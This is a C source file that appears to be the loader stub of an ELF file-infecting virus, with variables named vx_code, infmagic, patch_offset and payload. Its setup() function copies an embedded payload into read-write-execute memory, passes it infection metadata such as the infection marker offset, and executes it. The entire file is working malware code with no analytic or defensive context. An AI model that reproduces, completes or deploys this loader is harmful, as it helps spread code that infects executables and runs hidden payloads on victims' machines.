extern char _start;
extern unsigned long patch_offset;

extern unsigned long politic_entry;
extern unsigned long politic_len;

extern unsigned long payload_addr;
extern unsigned long payload_entry;
extern unsigned long payload_len;

extern char infmagic;

#include "wrapper.h"
#include "include/elf.h"

struct args
{
    unsigned int patch_offset;
    unsigned long politic_entry;
    unsigned long politic_len;
    unsigned long payload_addr;
    unsigned long payload_entry;
    unsigned long payload_len;
    unsigned char *_start;
    unsigned char *politic;
    unsigned char *payload;
    unsigned long infmagic_off;
};

void setup(void)
{
    char *vx_code = mmap(0, payload_len, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct args *arg = mmap(0, sizeof(struct args), PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    arg->_start = &_start;
    arg->patch_offset = patch_offset;
    arg->politic_entry = politic_entry;
    arg->politic_len = politic_len;
    arg->payload_addr = payload_addr;
    arg->payload_entry = payload_entry;
    arg->payload_len = payload_len;
    arg->politic = &_start - politic_entry;
    arg->payload = &_start + payload_addr;
    arg->infmagic_off = (&infmagic - &_start);

    for (int i = 0; i < payload_len; i++)
        vx_code[i] = (&_start + payload_addr)[i];
    write(1, "check\n", 6);

    ((void (*)(struct args *))(vx_code + payload_entry))(arg);

    munmap(vx_code, payload_len);
    munmap(arg, sizeof(struct args));
}
